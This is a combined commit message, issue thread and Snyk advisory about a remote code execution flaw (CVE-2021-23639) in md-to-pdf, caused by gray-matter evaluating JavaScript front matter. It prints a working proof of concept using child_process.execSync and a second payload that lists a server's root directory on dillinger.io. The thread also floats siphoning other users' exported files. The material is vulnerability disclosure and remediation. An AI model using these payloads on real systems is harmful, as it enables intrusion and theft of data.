fix: disable JS engine for front-matter by default to prevent RCE

```
BREAKING CHANGE: If you previously used JS in front-matter, you'll now have to set `--gray-matter-options 'null'` (or `gray_matter_options: undefined`) to overwrite the new default options that disable the JS engine.

Fixes [#99](https://github.com/simonhaenisch/md-to-pdf/issues/99).

|  |  | The options can also be set with front-matter or a config file (except `--md-file-encoding` can't be set by front-matter). In that case, remove the leading two hyphens (`--`) from the cli argument name and replace the hyphens (`-`) with underscores (`\_`). `--stylesheet` and `--body-class` can be passed multiple times (i. e. to create an array). It's possible to set the output path for the PDF as `dest` in the config. If the same config option exists in multiple places, the priority (from low to high) is: defaults, config file, front-matter, cli arguments. |

|  |  | ## Security Consideration |
|  |  | ## Security Considerations |
|  |  |  |
|  |  | ### Local file server |
|  |  |  |
|  |  | By default, this tool serves the current working directory via a http server on `localhost` on a relatively random port (or the port you specify), and that server gets shut down when the process exits (or as soon as it is killed). Please be aware that for the duration of the process this server will be accessible on your local network, and therefore all files within the served folder that the process has permission to read. So as a suggestion, maybe don't run this in watch mode in your system's root folder. 😉 |
|  |  |  |
|  |  | ### Don't trust markdown content you don't control |
|  |  |  |
|  |  | If you intend to use this tool to convert user-provided markdown content, please be aware that - as always - you should sanitize it before processing it with `md-to-pdf`. |
|  |  |  |
|  |  | ## Customization/Development |
|  |  |  |
|  |  | After cloning and linking/installing globally (`npm link`), just run the transpiler in watch mode (`npm start`). Then you can start making changes to the files and Typescript will transpile them on save. NPM 5+ uses symlinks for locally installed global packages, so all changes are reflected immediately without needing to re-install the package (except when there have been changes to required packages, then re-install using `npm i`). This also means that you can just do a `git pull` to get the latest version onto your machine. |

### **[magicOz](/magicOz)** commented [Sep 22, 2021](#issue-1003945139)

| The library [gray-matter](https://www.npmjs.com/package/gray-matter) (used by **md-to-pdf** to parse front matter) exposes a JS-engine by default, which essentially runs **eval** on the given Markdown.  <https://github.com/simonhaenisch/md-to-pdf/blob/master/src/lib/md-to-pdf.ts#L26>  Given that **md-to-pdf** is *only* a Markdown to PDF-library and looking at how other projects use it - I think it is an undesirable *feature* to be able to execute any arbitrary Javascript by anyone in control of the Markdown content.  A possible fix would be to override gray-matter's JS-engine:  ``` const { content: md, data: frontMatterConfig } = grayMatter(mdFileContent, { engines : { js : () => {} } } ); ```  PoC:  ``` $ cat /tmp/RCE.txt cat: /tmp/RCE.txt: No such file or directory $ node poc.js  $ cat /tmp/RCE.txt uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)  ```  poc.js:  ``` const { mdToPdf } = require('md-to-pdf');  var payload = '---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE';  (async () => { 	await mdToPdf({ content: payload }, { dest: './output.pdf' }); })(); ``` |

| Thanks for the info. I wasn't aware of this feature in gray-matter.  I think it is an undesirable *feature* to be able to execute any arbitrary Javascript by anyone in control of the Markdown content.  I think you shouldn't use a tool like this on markdown content that you don't control, especially not without any security concerns (i. e. never trust user input), but yeah I agree that it might prevent some accidental security problems if the JS engine was disabled. |

| I just checked the docs and it's also possible to set `{ language: 'yaml' }` which should already be sufficient to disable JS code execution. Might make sense to expose this options object as a config option so that people can change it to `js` explicitly in case they want to use JS in their front matter. |

| The documentation seems to be a bit misleading and `{ language : '...' }` actually just means the **default** engine if the language identifier is omitted from the front matter, all engines are still accessible by using `---<language identifier>`.  Agree, an opt-in config option for which engines to use makes sense and sounds like the right way to solve this. |

| BTW I saw in your Github activity that you also raised an issue with dillinger.io which is using this package, and I'm actually able to use this exploit there, e. g. I would add a front matter like  ``` ---js {     css: `body::before { content: "${require('fs').readdirSync('/').join()}"; display: block }`, } ---  ```  and then use export > PDF. I'm not sure about the damage that can be done here but one idea would be to try and send myself all file exports that are happening in the hopes that someone uses dillinger.io for secret/internal data.  FYI [@joemccann](https://github.com/joemccann), I'll see that I get a new major version out that disables this feature by default, and make a PR to your repo to update the package. |

| Yes, you're right - I was reviewing dillinger and that's how I found this library. :) Currently, instances of dillinger are vulnerable to RCE due to this. |

#### Introduced: 23 Sep 2021

[CVE-2021-23639  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2021-23639) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-94  (opens in a new tab)](https://cwe.mitre.org/data/definitions/94.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

Upgrade `md-to-pdf` to version 5.0.0 or higher.

## Overview

[md-to-pdf](https://www.npmjs.org/package/md-to-pdf) is a CLI tool for converting Markdown files to PDF.

Affected versions of this package are vulnerable to Remote Code Execution (RCE) due to utilizing the library gray-matter to parse front matter content, without disabling the JS engine.

## PoC:

```

//Before running poc.js:

$ cat /tmp/RCE.txt

cat: /tmp/RCE.txt: No such file or directory

//After running poc.js

$ node poc.js

$ cat /tmp/RCE.txt

uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)

```

poc.js:

```

const { mdToPdf } = require('md-to-pdf');

var payload = '---js\n((require("child_process")).execSync("id > /tmp/RCE.txt"))\n---RCE';

(async () => {
await mdToPdf({ content: payload }, { dest: './output.pdf' });
})();

```

### CVSS Scores

version 3.1
### Snyk

9.8 critical

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is a total loss of integrity, or a complete loss of protection. For example, the attacker is able to modify any/all files protected by the impacted component. Alternatively, only some files can be modified, but malicious modification would present a direct, serious consequence to the impacted component.

  **High**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**
